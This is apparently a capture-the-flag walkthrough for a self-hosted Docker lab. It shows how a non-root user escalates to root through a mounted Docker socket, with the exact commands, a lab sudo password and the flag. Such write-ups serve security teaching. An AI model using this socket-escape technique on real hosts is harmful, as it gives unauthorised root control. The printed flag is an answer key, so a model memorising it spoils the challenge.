# Docker Escape Challenge: Asylum Gate Control - Walkthrough

## Challenge Overview

You are trapped inside a privileged Docker container that controls the final gate of an asylum. Your objective is to escape the container, retrieve the authorization code (flag), and unlock the gate using the SCADA terminal.

## Challenge Setup

1. **Build and start the container:**
   ```bash
   ./setup.sh
   # or manually:
   docker-compose up -d --build
   ```

2. **Verify the container is running:**
   ```bash
   docker ps | grep asylum_gate_control
   ```

## Step-by-Step Walkthrough

### Step 1: Explore the SCADA Terminal

First, let's see what we're working with by connecting to the SCADA terminal:

```bash
nc localhost 9001
```

Once connected, try some commands:
- `help` - See available commands
- `status` - Check gate status
- `info` - View system information

You'll notice the gate is LOCKED and requires an authorization code to unlock.

### Step 2: Access the Container

Exit the SCADA terminal (type `exit`) and access the container shell:

```bash
docker exec -it asylum_gate_control /bin/bash
```

You'll be logged in as `scada_operator`.

### Step 3: Investigate the Container Environment

Check what we have access to:

```bash
# Check current user
whoami
# Output: scada_operator

# Check if we're in a container
cat /proc/self/cgroup | grep docker

# Check for mounted Docker socket
ls -la /var/run/docker.sock
# Output: srw-rw---- 1 root docker 0 ... /var/run/docker.sock

# Check if docker CLI is available
docker --version
```

**Key Observations:**
- We're a non-root user (`scada_operator`)
- Docker socket is mounted at `/var/run/docker.sock`
- Docker CLI is installed
- The container is privileged (has SYS_ADMIN capabilities)

### Step 4: Understanding the Challenge

The flag is stored in a location requiring root access. We need to:

1. Find where the flag is located
2. Access it using Docker escape techniques
3. Retrieve the flag and unlock the gate

Let's check for the flag:

```bash
# Try to access root directory
sudo cat /root/.asylum/flag
# Password: gatekeeper123

# OR, we can use Docker socket escape (no password needed!)
```

### Step 5: Docker Socket Escape

Since we have access to the Docker socket, we can use it to execute commands as root inside the container:

**Method 1: Using sudo with Docker CLI**

```bash
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag
```

**Method 2: Using hostname**

```bash
sudo docker -H unix:///var/run/docker.sock exec -u root $(hostname) cat /root/.asylum/flag
```

**Method 3: Finding container ID first**

```bash
# Get container ID
CONTAINER_ID=$(cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3 | cut -c1-12)
echo $CONTAINER_ID

# Use it to read the flag
sudo docker -H unix:///var/run/docker.sock exec -u root $CONTAINER_ID cat /root/.asylum/flag
```

**Expected Output:**
```
THM{unl0ckth3g4t350fh3ll}
```

### Step 6: Unlock the Gate

Now that we have the flag, let's unlock the gate using the SCADA terminal:

```bash
# Exit the container if still inside
exit

# Connect to SCADA terminal
nc localhost 9001
```

Once connected to the SCADA terminal:

```
unlock THM{unl0ckth3g4t350fh3ll}
```

Or you can provide the file path:

```
unlock /root/.asylum/flag
```

**Expected Output:**
```
╔══════════════════════════════════════════════════════════╗
║                  GATE UNLOCK SUCCESSFUL                  ║
╚══════════════════════════════════════════════════════════╝

[✓] Authorization code verified
[✓] Gate mechanism engaged
[✓] Final gate is now OPEN

Congratulations! You have successfully escaped the asylum!

FLAG: THM{unl0ckth3g4t350fh3ll}
```

## Solution Summary

**The complete solution:**

```bash
# 1. Access container
docker exec -it asylum_gate_control /bin/bash

# 2. Use Docker socket to escape and get flag
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/flag

# 3. Unlock gate via SCADA terminal
nc localhost 9001
# Then type: unlock THM{unl0ckth3g4t350fh3ll}
```

## Key Learning Points

1. **Docker Socket Escape:** When a Docker socket is mounted inside a container, you can use it to control the Docker daemon on the host, allowing you to execute commands in other containers (including the current one) with elevated privileges.

2. **Privileged Containers:** Privileged containers have access to host devices and kernel capabilities, making escape techniques easier.

3. **Non-Root User Bypass:** Even as a non-root user, having access to Docker socket or sudo privileges allows you to escalate to root access.

4. **SCADA Security:** This challenge demonstrates how critical infrastructure control systems (SCADA) could be vulnerable if running in insecure containers.

## Alternative Methods

If the Docker socket method doesn't work, you could also:

1. **Use sudo with password:**
   ```bash
   sudo cat /root/.asylum/flag
   # Password: gatekeeper123
   ```

2. **Explore the filesystem:**
   ```bash
   sudo find / -name "flag" 2>/dev/null
   sudo ls -la /root/.asylum/
   ```

3. **Check environment variables:**
   ```bash
   env | grep -i flag
   ```

## Flag

**THM{unl0ckth3g4t350fh3ll}**

## Cleanup

After completing the challenge:

```bash
docker-compose down
```

This will stop and remove the container.


